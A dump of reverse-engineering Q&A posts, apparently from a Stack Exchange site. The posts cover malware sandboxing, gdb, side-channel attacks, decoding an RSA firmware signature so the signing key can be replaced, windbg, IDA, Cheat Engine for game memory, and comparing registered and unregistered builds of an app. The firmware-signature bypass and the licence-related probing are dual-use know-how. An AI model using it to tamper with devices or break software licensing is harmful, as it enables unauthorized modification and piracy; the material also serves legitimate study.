<p><strong>First off</strong>, you could use <a href=""http://www.cuckoosandbox.org"" rel=""nofollow""><strong>Cuckoo Sandbox</strong></a>. It is an automated malware analysis system. It is open source and its modules are written in <a href=""http://python.org"" rel=""nofollow""><strong>Python</strong></a>. To quote the website: </p>

<blockquote>
  <p>Malware! Tear it apart, discover its ins and outs and collect actionable threat data. Cuckoo is the leading open source automated malware analysis system.</p>
</blockquote>

<p>Pretty exciting, isn't it? I believe, it will capture dropped files by default. Once a malware sample is submitted to <strong><a href=""http://www.cuckoosandbox.org"" rel=""nofollow"">Cuckoo Sandbox</a></strong> and analysis is completed, user gets analysis report. Certain sub-directory of the analysis report will contain files <strong>Cuckoo</strong> was able to dump. For more information check out <strong><a href=""https://cuckoo.readthedocs.org/en/latest/usage/results/index.html?highlight=dropped"" rel=""nofollow"">Cuckoo's Analysis Result</a></strong> page. </p>

<p>In addition, you could create your own custom module to process dropped files. What are <strong>processing modules</strong>? Per <a href=""https://cuckoo.readthedocs.org/en/latest/customization/processing/index.html"" rel=""nofollow""><strong>Cuckoo Doc Website</strong></a>:  </p>

<blockquote>
  <p>Cuckoo’s processing modules are Python scripts that let you define custom ways to analyze the raw results generated by the sandbox and append some information to a global container that will be later used by the signatures and the reporting modules. You can create as many modules as you want, as long as they follow a predefined structure...</p>
</blockquote>

<p>I am pretty sure there are other automated sandboxes out there as well. However, you have to remember, there is no 100% guarantee a sandbox will process your malware just the way it would execute in real life environment. </p>

<p><strong>Second method</strong>. You really need to know <strong>HOW</strong> dropped files are deleted for this method to work. I have already mentioned it in the comments above. You could also patch your executable. Let's say <strong><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa363915%28v=vs.85%29.aspx"" rel=""nofollow"">DeleteFile()</a></strong> is used. If patching malware is not an option, you could hook <strong><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa363915%28v=vs.85%29.aspx"" rel=""nofollow"">DeleteFile()</a></strong> function system wide. It is standard Windows API used to delete a file. This function is exported by <strong>Kernel32.dll</strong>. There is a lot written about system wide or global hooks and ways to accomplish it. I will not go in details about it here. However, there is one thing worth mentioning, you have to make sure you ""trick"" malware into ""thinking"" file is indeed delete by returning appropriate values. That's why, there could be a problem with using ACL directly. What if malware checks a return of <strong>DeleteFile()</strong> (or whatever it uses to delete the dropped file), and gets <strong>ERROR_ACCESS_DENIED</strong>? It might very well divert it from the regular ""desired"" execution path. </p>

<p>In addition, there are debuggers out there, that you help you make this process rather semi-automated. To mention few: <a href=""http://debugger.immunityinc.com"" rel=""nofollow""><strong>Immunity Debugger</strong></a> by <a href=""http://www.immunityinc.com"" rel=""nofollow""><strong>Immunity Inc</strong></a>. It employs very well supported Python API for automation and scripting. There are other option out there as well.</p>

<p>What I would like to mention at the end is that you are absolutely right. You might need to look into creating a little tool of your own. There is no ""one-fits-all"" solution. Some automated solutions might work better then others. From time to time you will have to dig in. Remember, getting your hands ""dirty"" gives you great and in-depth understanding of things happening behind the ""curtain"". I personally love such an involvement, and find it to be a really great learning experience.</p>
","2282"
"How to get current PHP function name in gdb?","947","","<p>I'm following these <a href=""https://bugs.php.net/bugs-generating-backtrace.php"" rel=""nofollow"">steps</a> to locate the current PHP function call as below:</p>

<ol>
<li><p>Run dummy script:</p>

<pre><code>$ gdb -ex run --args php -r ""sleep(10);""
</code></pre></li>
<li><p>Pressed <kbd>Ctrl+C</kbd> to get back to <code>gdb</code> to run:</p>

<pre><code>(gdb) bt full
#1  0x00007ffff6007dd4 in __sleep (seconds=0) at ../sysdeps/unix/sysv/linux/sleep.c:137
        ts = {tv_sec = 8, tv_nsec = 306649388}
        set = {__val = {65536, 0 &lt;repeats 15 times&gt;}}
        oset = {__val = {0, 4469319, 4294967295, 8081486, 140737319884960, 140737354070488, 15761488, 15454080, 15337134, 
            140737354001040, 0, 7307048, 16048064, 206158430232, 140737488342304, 140737488342096}}
        result = &lt;optimized out&gt;
#2  0x00000000006156ef in zif_sleep ()
No symbol table info available.
#3  0x00000000006ddd7b in dtrace_execute_internal ()
No symbol table info available.
#4  0x000000000079dde5 in ?? ()
No symbol table info available.
#5  0x0000000000717b18 in execute_ex ()
No symbol table info available.
#6  0x00000000006ddc79 in dtrace_execute_ex ()
No symbol table info available.
#7  0x00000000006e1b0a in zend_eval_stringl ()
No symbol table info available.
#8  0x00000000006e1bf9 in zend_eval_stringl_ex ()
...
(gdb) frame 2
#2  0x00000000006156ef in zif_sleep ()
(gdb) print (char *)(executor_globals.function_state_ptr-&gt;function)-&gt;common.function_name
Attempt to extract a component of a value that is not a structure.      
(gdb) print (char *)(executor_globals.function_state_ptr-&gt;function)
Attempt to extract a component of a value that is not a structure.
(gdb) print (char *)(executor_globals)
$2 = 0xffffffffffffcf48 &lt;error: Cannot access memory at address 0xffffffffffffcf48&gt;
</code></pre>

<p>So it seems <code>executor_globals</code> symbol is not available. Is it because the binary has been optimized, I'm in the wrong frame or something else? Or I should use <code>lldb</code> instead?</p></li>
</ol>
","<p>According to <a href=""https://derickrethans.nl/what-is-php-doing.html"" rel=""nofollow noreferrer"">this link</a>, it should be possible to find the function in use with the following steps:</p>

<ol>
<li>Attach gdb to the currently-running PHP process: <code>gdb -p &lt;processid&gt;</code></li>
<li>Load in the PHP <code>.gdbinit</code> file for your version of PHP (available from <a href=""https://github.com/php/php-src/blob/master/.gdbinit"" rel=""nofollow noreferrer"">here</a>)</li>
<li>Use the <code>zbacktrace</code> command to display the currently-running PHP script</li>
</ol>

<p>For example:</p>

<pre><code>gdb -p 4584
(gdb) source PHP_5_5/.gdbinit
(gdb) zbacktrace
[0xec906090] addOne() /tmp/yourscript.php:9
</code></pre>
","14068"
"What is SCARE (Side-Channel Attacks Reverse-Engineering)?","947","","<p>When reversing smart-cards, the <a href=""http://en.wikipedia.org/wiki/Side_channel_attack"" rel=""nofollow"">side-channel attacks</a> are known to be quite effective on hardware. But, what is it, and can it be used in software reverse-engineering and how?</p>
","<p>A '<em>side-channel attack</em>' define any technique that will consider unintended and/or indirect information channels to reach his goal. It has been first defined in smart-card cryptography to describe attacks which are using unintentional information leak from the embedded chip on the card and that can be used in retrieval of keys and data. For example, it may be used by monitoring:</p>

<ul>
<li><p><strong>Execution Time</strong> (Timing attack): To distinguish which operations has been performed and guess, for example, which branch of the code has been selected (and, thus, the value of the test).</p></li>
<li><p><strong>Power Consumption</strong> (Power monitoring attack): To distinguish precisely what sequence of instructions has been performed and be able to recompose the values of the variables. Note that there exist several techniques of analysis using the same input but with slightly different way of analyzing it. For example, we can list: <em>Single Power Analysis</em> (SPA), <em>Differential Power Analysis</em> (DPA), <em>High-order Differential Power Analysis</em> (HO-DPA), <em>Template Attacks</em>, ...</p></li>
<li><p><strong>Electromagnetic Radiation</strong> (Electromagnetic attacks): Closely related to power consumption, but can also provide information that are not found in power consumption especially on RFID or NFC chips.</p></li>
</ul>

<p>If you're more interested in learning how to leverage this information then I'd suggest to start by reading <a href=""http://rads.stackoverflow.com/amzn/click/1441940391"" rel=""nofollow"">Power Analysis Attacks</a>. Don't get 'scared' away by the fact that the book is about smart cards. Most of the information also applies 1-to-1 on 'normal' (SoC) embedded devices.</p>

<p>Forgot to mention there's an open source platform called <a href=""http://sourceforge.net/projects/opensca/"" rel=""nofollow"">OpenSCA</a> and some open source hardware called FOBOS (Flexible Open-source BOard for Side-channel) for which I can't seem to find a proper link from home.</p>

<h2>Application to Software Reverse-engineering</h2>

<p>Speaking about the application of side-channel attacks in software reverse engineering now, it is more or less any attacks that will rely on using unintended or indirect information leakage. The best recent example is this <a href=""http://shell-storm.org/blog/A-binary-analysis-count-me-if-you-can/"" rel=""nofollow"">post</a> from <a href=""https://twitter.com/JonathanSalwan"" rel=""nofollow"">Jonathan Salwan</a> describing how he guessed the password of a crackme just by counting the number of instructions executed on various inputs with <a href=""http://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool"" rel=""nofollow"">Pin</a>.</p>

<p>More broadly, this technique has been used since long in software reverse-engineering without naming it, or could have improved many analysis. The basic idea is to first consider that if a piece of software is too obscure to understand it quickly, we can consider it as a black-box and think about using a side-channels technique to guess the enclosed data through a guided trial and error technique.</p>

<p>The list of side-channels available in software reverse-engineering is much longer than the one we have in hardware. Because it enclose the previous list and add some new channels such as (non exhaustive list):</p>

<ul>
<li><p><strong>Instruction Count</strong>: Allow to identify different behaviors depending on the input.</p></li>
<li><p><strong>Read/Write Count</strong>: Same as above, with more possibilities to identify patterns because it includes also instruction read.</p></li>
<li><p><strong>Raised Interrupt Count</strong>: Depending on what type of interrupt is raised, when and how, you might identify different behaviors and be able to determined the good path to your goal.</p></li>
<li><p><strong>Accessed Instruction Addresses</strong>: Allow to rebuild the parts of the program that are active at a precise moment.</p></li>
<li><p><strong>Accessed Memory Addresses</strong>: Allow to rebuild data pattern or complex data-structure stored or accessed in memory (eg. in the heap).</p></li>
</ul>

<p>This list is far from being exhaustive, but basically tools such as Valgrind VM or others can be used to perform such analysis and quickly deduce information about the behavior of a given program, thus speeding up the reverse-engineering.</p>

<h2>Obfuscation and Possible Counter-measures</h2>

<p>Trying to build a software which will be resistant to such attacks will borrow also a lot from the smart-card industry. But, not only. Here are a few tricks, I could think of (but far from being complete about all we can find).</p>

<h3>Armoring Program Branches</h3>

<p>The instruction count is extremely efficient to detect which branch has been taken in code like this:</p>

<pre><code>if (value)
   ret = foo();
else 
   ret = bar();
</code></pre>

<p>With <code>foo()</code> and <code>bar()</code> having different instruction count.</p>

<p>This can be defeated by executing <code>foo()</code> and <code>bar()</code> whatever <code>value</code> is and deciding afterward what is the value of <code>ret</code>.</p>

<pre><code>tmp_foo = foo();
tmp_bar = bar();
if (value)
  ret = tmp_foo;
else
  ret = tmp_bar;
</code></pre>

<p>This technique render your program much more difficult to guess from a side-channel attack, but also much less efficient. One has to find a proper trade-off.</p>

<h3>Countering Timing Attacks</h3>

<p>Timing attacks are extremely easy to perform and difficult to workaround because <code>sleep()</code> cannot be an option (too easy to detect in a code and, anyway you cannot assume a specific speed for the processor). The programmer has to identify the execution time of each branch of his program and to <em>balance</em> each branch with extra non-useful operations which are of the same computational power than the ones from the other branchs. The point being to render each branch indistinguishable from the others only based on the execution time. </p>

<h3>Threading Madness</h3>

<p>Another way to dilute the side-channel is to massively multi-thread your program. Imagine that each branch of your program is executed in a separate thread, and one variable tell in which thread the current program really is (if possible in a cryptic manner). Then side-channel analysis will be much more difficult to perform.</p>

<h2>Conclusion and Further Research</h2>

<p>Side-channel attacks has been widely under-estimated for software reverse-engineering, it can drastically speed-up the reverse of many programs. But, in the same time, obfuscation techniques exists and have to be developed specifically targeting software reverse-engineering. So, don't be surprised if you see more and more novelties related to this field.</p>
","1900"
"Defeat rsa hash verification","946","","<p>I am analysing an embedded system running QNX on armle, <code>uname -a</code> identifies it as:</p>

<pre><code>QNX mmx 6.5.0 2012/06/20-13:49:13EDT nVidia_Tegra2(T20)_Devlite_Boards armle
</code></pre>

<p>Firmware updates come with a file called <code>metainfo2.txt</code> which always ends with a signature block, eg:</p>

<pre><code>[Signature]
signature1 = ""a73e111de512e09bad2dc08eff685a38""
signature2 = ""4fc032192a20fd1e242ad64af5b509a7""
signature3 = ""6a7432f754aff0d6b74a7ec2072cbb11""
signature4 = ""e91f68f569508b77712d1869edd6d0b9""
signature5 = ""923eb77ba815dba8e44d5e09412cdf2e""
signature6 = ""830518f3b38d48df892a3a0c65cc67f1""
signature7 = ""09e5e0f5f06ce0376d032ab21051510f""
signature8 = ""3dab7f75fcdf54a96d8aa7f3c617f76d""
</code></pre>

<p>This looks like it's a RSA encryption and is used to determine if the file contents were changed. I <em>think</em> it's a hash of a particular section of the file: <code>MetafileChecksum = ""ec5afd6459c3579ebed8841cc41fe17bb61b814d""</code></p>

<p>I found a folder with public keys which has a subfolder name MetainfoKey and contains likely the public key, a 288 byte file:</p>

<pre><code>C0 F3 89 EE C7 B6 6C 9D C7 36 50 8F F8 8A EB 1F
B1 13 94 2E AD 02 08 14 D0 8D 29 E8 68 F1 4B 20
86 BC D7 DD CC BA 75 59 F9 99 E7 6D 24 61 96 60
BB E1 74 34 DA 59 98 80 87 F2 A9 9C D4 65 B1 FF
42 35 22 B7 8C B0 DE 46 3A 66 96 13 D3 56 DF A9
E8 6E 0E 2E 0B 6D AB 5D E8 91 31 C5 A0 72 7A EA
B1 76 72 78 AB 10 1D CD 9C 3C FC 10 26 70 5C 1D
AB 3B F5 3B F5 0A FA FB 3F 52 DA 2C EB 0B EE 57
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 03
83 0A CD 65 56 FC 2F B4 7B 1B 67 43 12 E3 4E 7A
0A AD 1E DF BA 7E B2 79 D9 51 3A DB 10 16 61 48
13 1B BA 9C 85 2A B7 01 91 49 16 65 62 94 61 6B
B1 A9 B8 F8 46 2E BC 20 6D E5 7F 53 AF EF 00 00
53 AB 8E 4F 63 29 BF 00 B0 ED 45 E8 E9 20 67 8E
F6 7A F8 BC CB 7B 4D CF 88 01 59 BB CB F1 B1 04
D4 A1 C0 57 70 AA D7 38 E8 BD 9A 28 4E 94 99 5C
B7 96 49 28 5A C4 04 9C 6B 57 8F C5 4F 74 6A C9
</code></pre>

<p>My objective is to be able to change <code>metainfo2.txt</code> and a possible method could be to replace the public key with a new one but I need to understand how the signature section is used to verify the file contents. I am looking for answer or pointers on how to achieve this...</p>
","<p>Your hunches are correct. Appending all the numbers in the signature fields you get the number </p>

<p><i>s</i> = 0xa73e111de512e09bad2dc08eff685a384fc032192a20fd1e242ad64af5b509a76a7432f754aff0d6b74a7ec2072cbb11e91f68f569508b77712d1869edd6d0b9923eb77ba815dba8e44d5e09412cdf2e830518f3b38d48df892a3a0c65cc67f109e5e0f5f06ce0376d032ab21051510f3dab7f75fcdf54a96d8aa7f3c617f76d</p>

<p>which is too large to fit with a modulus of</p>

<p><i>n</i>  = 0x830ACD6556FC2FB47B1B674312E34E7A0AAD1EDFBA7EB279D9513ADB10166148131BBA9C852AB701914916656294616BB1A9B8F8462EBC206DE57F53AFEF000053AB8E4F6329BF00B0ED45E8E920678EF67AF8BCCB7B4DCF880159BBCBF1B104D4A1C05770AAD738E8BD9A284E94995CB79649285AC4049C6B578FC54F746AC9</p>

<p>so we'll use a modulus of </p>

<p><i>n</i>  = 0xC0F389EEC7B66C9DC736508FF88AEB1FB113942EAD020814D08D29E868F14B2086BCD7DDCCBA7559F999E76D24619660BBE17434DA59988087F2A99CD465B1FF423522B78CB0DE463A669613D356DFA9E86E0E2E0B6DAB5DE89131C5A0727AEAB1767278AB101DCD9C3CFC1026705C1DAB3BF53BF50AFAFB3F52DA2CEB0BEE57</p>

<p>taking the signature <i>s</i> raised to the power of 3 modulus <i>n</i> we wind up with the following value</p>

<p>0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff003021300906052b0e03021a050004145e3246e50a4dad079a61f99fa3297c01d802e038</p>

<p>This is a standard signature format. The 0x1ffff...00 is padding. The 3021... is an ASN.1 encoded structure.   </p>

<p>Parse that using OpenSSL</p>

<p><i>openssl.exe asn1parse -inform DER -dump -i</i></p>

<pre>
    0:d=0  hl=2 l=  33 cons: SEQUENCE
    2:d=1  hl=2 l=   9 cons:  SEQUENCE
    4:d=2  hl=2 l=   5 prim:   OBJECT            :sha1
   11:d=2  hl=2 l=   0 prim:   NULL
   13:d=1  hl=2 l=  20 prim:  OCTET STRING
      0000 - 5e 32 46 e5 0a 4d ad 07-9a 61 f9 9f a3 29 7c 01   ^2F..M...a...)|.
      0010 - d8 02 e0 38                                       ...8
</pre>

<p>Which tells us that the signature is based off of a SHA1 hash. To change the data signed by these keys, you'd need to generate your own 1024 bit RSA key replace the c0... key with your own public key, change the data, replace the hash in the data above and sign that data using your private key. </p>
","12287"
"Why is there in a nop in the while loop","946","","<p>So I have the following C code I wrote:</p>

<pre><code>#include &lt;stdio.h&gt;


int main() {
    int i = 1;

    while(i) {
        printf(""in loop\n"");
        i++;

        if(i == 10) {
            break;
        }
    }

    return 0;
}
</code></pre>

<p>Compiled with gcc (Ubuntu/Linaro 4.7.2-2ubuntu1) 4.7.2 it disassembles to this:</p>

<pre><code>   0x000000000040051c &lt;+0&gt;: push   %rbp
   0x000000000040051d &lt;+1&gt;: mov    %rsp,%rbp
   0x0000000000400520 &lt;+4&gt;: sub    $0x10,%rsp
   0x0000000000400524 &lt;+8&gt;: movl   $0x1,-0x4(%rbp)
   0x000000000040052b &lt;+15&gt;:    jmp    0x400541 &lt;main+37&gt;
   0x000000000040052d &lt;+17&gt;:    mov    $0x400604,%edi
   0x0000000000400532 &lt;+22&gt;:    callq  0x4003f0 &lt;puts@plt&gt;
   0x0000000000400537 &lt;+27&gt;:    addl   $0x1,-0x4(%rbp)
   0x000000000040053b &lt;+31&gt;:    cmpl   $0xa,-0x4(%rbp)
   0x000000000040053f &lt;+35&gt;:    je     0x400549 &lt;main+45&gt;
   0x0000000000400541 &lt;+37&gt;:    cmpl   $0x0,-0x4(%rbp)
   0x0000000000400545 &lt;+41&gt;:    jne    0x40052d &lt;main+17&gt;
   0x0000000000400547 &lt;+43&gt;:    jmp    0x40054a &lt;main+46&gt;
   0x0000000000400549 &lt;+45&gt;:    nop
   0x000000000040054a &lt;+46&gt;:    mov    $0x0,%eax
   0x000000000040054f &lt;+51&gt;:    leaveq 
   0x0000000000400550 &lt;+52&gt;:    retq  
</code></pre>

<p>Why is there a <code>nop</code> on +45? And why does not <code>je</code> on +35 just jump right to +46?</p>
","<p>It might be for function alignment. As it is now it returns on <code>0x400550</code>, which can be divided by 8. If it returned on <code>0x40054f</code> it isn't aligned. Just a speculation, though.</p>
","2877"
"Find main() function of executable with windbg","945","","<p>I have an executable without debug symbols, and I want to get to its' <code>main()</code> function.</p>

<p>What I do is putting breakpoint at <code>$exentry</code> address, but this address of some CRT-initialization. To get to the <code>main()</code> I need to single-step until I see some changes in working application. </p>

<p>Is there any other procedure to skip CRT code?</p>
","<p>no there is no shortcut loader knows only about the $exentry because it is an embedded pointer in the PeHeader<br>
from there to main is mostly traversed by either single stepping or observing and recognizing known functions by practice and experience<br>
the crt code is fairly common and the source for crt is available in crt folder of any visual studio installation  (this will help if you have the binary with debug info </p>

<p>if the binary is stripped or built without debuginfo in release mode crt src wont help you pinpoint the main()</p>

<p>in those case you should be able to recognize certain standard calls that the crt is going to make for example it would normally call <strong>kernel32!GetCommandLineXXXX</strong>  settig a bp on that function brings you closer to the main() another function you can set a breakpoint is 
<strong>kernel32!GetEnvironemStringXXXX</strong> 
and then set hardware breaks on the results 
once you have hit these breakpoints you can
you can use the standard prototype of main 
int main (int argc , char **argv , char* envp) construct to 
identify your main</p>

<pre><code>:\&gt;cdb -c ""bp $exentry;g;bp kernel32!GetCommandlineA;g;g poi(@esp)"" hell.exe

0:000&gt; cdb: Reading initial command 'bp $exentry;g;bp kernel32!GetCommandlineA;g;g poi(@esp)'
Breakpoint 0 hit
Breakpoint 1 hit
eax=002b36d8 ebx=7ffdf000 ecx=002b47e8 edx=002b4813 esi=00000000 edi=00000000
eip=01314082 esp=0024f9b0 ebp=0024f9e4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
image01310000+0x4082:
01314082 a3c4933201      mov     dword ptr [image01310000+0x193c4 (013293c4)],ea
x ds:0023:013293c4=00000000
</code></pre>

<p>the same area and the distance between exec_main and getcommandline function as an image of ollydbg debugging the same executable</p>

<p><a href=""https://i.stack.imgur.com/eYXZ8.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/eYXZ8.png"" alt=""enter image description here""></a></p>

<p>the same src built with debuginfo <strong>/Zi msvc compiler</strong> and snap shotted
<a href=""https://i.stack.imgur.com/MvIx3.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/MvIx3.png"" alt=""enter image description here""></a></p>

<p>to get more nearer you can employ the int argc 
you execute the binary so you know how many arguments you passed 
if you passed no arguments to the binary then int argc will be equal to 1 
if you passed 8 arguments int argc will be equal to 9 </p>

<p>with that in mind once you reached the breakpoint as enumerated above you can run a loop that enumerates the int argc in stack </p>

<pre><code>bp $exentry
bp kernel32!GetCommandLineA
g
g
g poi(@esp)
.while(@$t0= 0) {
pc 
.if ( poi(@esp) == 1) {r $t0 = 1} .else { r $t0 = 0}
}  
</code></pre>

<p>result of running the script  notice the address in screen shot above you have just one call to step to the wrapper for main()</p>

<pre><code>cdb -c ""$$&gt;a&lt; findwmain.txt"" hell.exe

0:000&gt; cdb: Reading initial command '$$&gt;a&lt; findwmain.txt'
Breakpoint 0 hit
Breakpoint 1 hit

eax=00000000 ebx=7ffd3000 ecx=00461228 edx=00461228 esi=00000000 edi=00000000
eip=000a40b5 esp=0034fb5c ebp=0034fb94 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
image000a0000+0x40b5:
000a40b5 e8e4420000      call    image000a0000+0x839e (000a839e)
</code></pre>
","12058"
"Tools to get started with reading memory during runtime","944","","<p>I want to get into reverse engineering and eventually be able to read the memory of a specific game during runtime and work with this data. For this purpose I have been doing research on that topic and was considering to start with a simple task to learn about the proper tools and stuff like finding offsets for various information.</p>

<p>I wanted to open an instance of the notepad editor, write some text into it and then access this text from another program after figuring out the right addresses. Although it seems as if OllyDbg is a famous choice I had problems to attach it to my notepad process. (Apparently some problem with the 64-bit Windows 10 would be my first guess here.)</p>

<p>Anyways, I was curious if you can suggest me tools and alternatives for OllyDbg to get into this, especially proving the possibility to search the memory contents with specific patterns, in my sample case the text I entered on screen.</p>
","<p><a href=""http://www.cheatengine.org/"" rel=""nofollow"">Cheat Engine</a> is probably the most well-known tool for scanning memory for strings.</p>

<p>Some of the better hex editors (such as <a href=""http://www.sweetscape.com/010editor/"" rel=""nofollow"">010 Editor</a> and <a href=""http://www.x-ways.net/winhex/"" rel=""nofollow"">WinHex</a>) also allow you to scan a process's memory for strings.</p>
","10947"
"Understanding assembly loop","944","","<p>I am having trouble understanding how this code knows when to stop looping. I am supposed to figure out what values are put into %edi. But I can't figure out how many times it loops.</p>

<pre><code>0x40106e      movl   $0x2b,0xffffffdc(%ebp)
0x401075      movl   $0x31,0xffffffe4(%ebp)
0x40107c      movl   $0x74,0xffffffec(%ebp)
0x401083      movl   $0x19,0xffffffe8(%ebp)
0x40108a      movl   $0x7,0xffffffd8(%ebp)
0x401091      movl   $0x14,0xffffffe0(%ebp)
0x401098      mov    $0xdead,%edi
0x40109d      mov    $0x2,%ecx
0x4010a2      mov    %ecx,%esi
0x4010a4      mov    $0x3,%ecx
0x4010a9      mov    $0x2,%ebx
0x4010ae      sub    %esi,%ebx
0x4010b0      imul   $0xc,%ebx,%ebx
0x4010b3      mov    $0x3,%edx
0x4010b8      sub    %ecx,%edx
0x4010ba      lea    0xffffffd8(%ebp),%eax
0x4010bd      lea    (%ebx,%edx,4),%ebx
0x4010c0      add    %ebx,%eax
0x4010c2      mov    (%eax),%edi
0x4010c4      loop   0x4010a9
0x4010c6      mov    %esi,%ecx
0x4010c8      loop   0x4010a2
0x4010ca      mov    $0xbeef,%edi
</code></pre>

<p>Edit: I now understand the looping logic. However I am having a hard time following all the values getting moved around. I am stuck here <code>lea    0xffffffd8(%ebp),%eax</code> 
How do I know what %ebp is?</p>
","<p>there are 2 loops in the code:</p>

<blockquote>
  <p>0x40109d      mov    $0x2,%ecx<br>
  <strong><em>0x4010a2</em></strong>      mov    %ecx,%esi<br>
  0x4010a4      mov    $0x3,%ecx<br>
  <strong>0x4010a9</strong>      mov    $0x2,%ebx<br>
  ...<br>
       first loop<br>
  ...<br>
  0x4010c4      <strong>loop   0x4010a9</strong><br>
  0x4010c6      mov    %esi,%ecx<br>
       second loop<br>
  0x4010c8      <strong><em>loop   0x4010a2</em></strong>  </p>
</blockquote>

<ul>
<li>first goes three times as <strong>3</strong> was moved into <strong>%ecx</strong> at 0x4010a4  </li>
<li>second loop will go two times as 2 was moved into <strong>%ecx</strong> at 0x40109d and saved at %esi before %ecx was used further inside the first loop.</li>
</ul>

<p>In addition here is information about <a href=""http://pdos.csail.mit.edu/6.828/2006/readings/i386/LOOP.htm"" rel=""nofollow"">LOOP</a> opcode  </p>

<blockquote>
  <p>0x4010ba      lea    0xffffffd8(%ebp),%eax</p>
</blockquote>

<p>This mean that %eax got the address from calculating  %ebp+0xffffffd8  </p>

<blockquote>
  <p>0x4010bd      lea    (%ebx,%edx,4),%ebx</p>
</blockquote>

<p>This one is where %ebx = %ebx + %edx * 4</p>

<blockquote>
  <p>0x4010c0      add    %ebx,%eax</p>
</blockquote>

<p>Here %ebx is added to %eax</p>

<blockquote>
  <p>0x4010c2      mov    (%eax),%edi</p>
</blockquote>

<p>Finally %edi gets the data that %eax points to.</p>

<p>A <a href=""http://en.wikipedia.org/wiki/X86_assembly_language"" rel=""nofollow"">small asm</a> reference. </p>
","2621"
"Statistics of call XREFs","943","","<p>Is it possible to see a kind of statistics in IDA about functions and how often they are referenced? When analyzing a program, I find it helpfull.</p>

<p>Functions that are referenced very often typically are common functionality. An example would be stuff like <code>strcmp()</code>, <code>malloc()/free()</code>, <code>strlen()</code>, etc..</p>

<p>Some of those are quite easy to identfiy (like  a <code>strcmp()</code> implementation), and giving a name to those functions early on, makes the analysis of the rest more easy.</p>
","<p>There might be an easier way to get the count XrefsTo a certain function, but this worked for me.</p>

<pre><code>from idaapi import *
funcs = Functions()
for f in funcs:
   name = Name(f)
   print ""%s %d"" % (name, len(list(XrefsTo(f))))
</code></pre>
","2992"
"how to extract a file embedded in an .exe?","938","","<p>for some months nearly a year of reversing an app not for cracking but my is to see the difference between the registered version and the unregistered one.
according to my research both apps(registered or not) displays a dialog but the unregistered version have two header files in different position, I found that using XORSearch and I thought like there is another executable inside the unregistered app then and I also found some calls like</p>

<pre><code>     005A0B8E    mov        edx,5A0D88; '[my documents]'
     005A0B93    call       @UStrLAsg
     005A0B98    lea        edx,[ebp-18]
     005A0B9B    mov        eax,dword ptr [ebp-4]
     005A0B9E    call       LowerCase
     005A0BA3    mov        edx,dword ptr [ebp-18]
     005A0BA6    mov        eax,dword ptr [ebp-0C]
     005A0BA9    call       Pos
     005A0BAE    test       eax,eax
    &gt;005A0BB0    jle        005A0BE1
     005A0BB2    lea        edx,[ebp-8]
     005A0BB5    mov        eax,5
     005A0BBA    call       005A0A7C
     005A0BBF    movzx      eax,byte ptr ds:[5A0D78]; 0x3
     005A0BC6    push       eax
     005A0BC7    push       ebx
     005A0BC8    lea        edx,[ebp-1C]
     005A0BCB    mov        eax,dword ptr [ebp-4]
     005A0BCE    call       LowerCase
     005A0BD3    mov        eax,dword ptr [ebp-1C]
     005A0BD6    mov        ecx,dword ptr [ebp-8]
     005A0BD9    mov        edx,dword ptr [ebp-0C]
     005A0BDC    call       StringReplace
     005A0BE1    lea        eax,[ebp-0C]
     005A0BE4    mov        edx,5A0DB4; '[all users documents]'
     005A0BE9    call       @UStrLAsg
     005A0BEE    lea        edx,[ebp-20]
     005A0BF1    mov        eax,dword ptr [ebp-4]
     005A0BF4    call       LowerCase
     005A0BF9    mov        edx,dword ptr [ebp-20]
     005A0BFC    mov        eax,dword ptr [ebp-0C]
     005A0BFF    call       Pos
     005A0C04    test       eax,eax
    &gt;005A0C06    jle        005A0C37
     005A0C08    lea        edx,[ebp-8]
     005A0C0B    mov        eax,2E
     005A0C10    call       005A0A7C
     005A0C15    movzx      eax,byte ptr ds:[5A0D78]; 0x3
     005A0C1C    push       eax
     005A0C1D    push       ebx
     005A0C1E    lea        edx,[ebp-24]
     005A0C21    mov        eax,dword ptr [ebp-4]
     005A0C24    call       LowerCase
     005A0C29    mov        eax,dword ptr [ebp-24]
     005A0C2C    mov        ecx,dword ptr [ebp-8]
     005A0C2F    mov        edx,dword ptr [ebp-0C]
     005A0C32    call       StringReplace
     005A0C37    lea        eax,[ebp-0C]
     005A0C3A    mov        edx,5A0DEC; '[program folder]'
     005A0C3F    call       @UStrLAsg
     005A0C44    lea        edx,[ebp-28]
     005A0C47    mov        eax,dword ptr [ebp-4]
     005A0C4A    call       LowerCase
     005A0C4F    mov        edx,dword ptr [ebp-28]
     005A0C52    mov        eax,dword ptr [ebp-0C]
     005A0C55    call       Pos
     005A0C5A    test       eax,eax
    &gt;005A0C5C    jle        005A0CA5
     005A0C5E    lea        edx,[ebp-30]
     005A0C61    mov        eax,[005CC76C]; ^Application:TApplication
     005A0C66    mov        eax,dword ptr [eax]
     005A0C68    call       TApplication.GetExeName
     005A0C6D    mov        eax,dword ptr [ebp-30]
     005A0C70    lea        edx,[ebp-2C]
     005A0C73    call       ExtractFileDir
     005A0C78    mov        eax,dword ptr [ebp-2C]
     005A0C7B    lea        edx,[ebp-8]
     005A0C7E    call       IncludeTrailingPathDelimiter
     005A0C83    movzx      eax,byte ptr ds:[5A0D78]; 0x3
     005A0C8A    push       eax
     005A0C8B    push       ebx
     005A0C8C    lea        edx,[ebp-34]
     005A0C8F    mov        eax,dword ptr [ebp-4]
     005A0C92    call       LowerCase
     005A0C97    mov        eax,dword ptr [ebp-34]
     005A0C9A    mov        ecx,dword ptr [ebp-8]
     005A0C9D    mov        edx,dword ptr [ebp-0C]
     005A0CA0    call       StringReplace
     005A0CA5    lea        eax,[ebp-0C]
     005A0CA8    mov        edx,5A0E1C; '[desktop]'
     005A0CAD    call       @UStrLAsg
     005A0CB2    lea        edx,[ebp-38]
     005A0CB5    mov        eax,dword ptr [ebp-4]
     005A0CB8    call       LowerCase
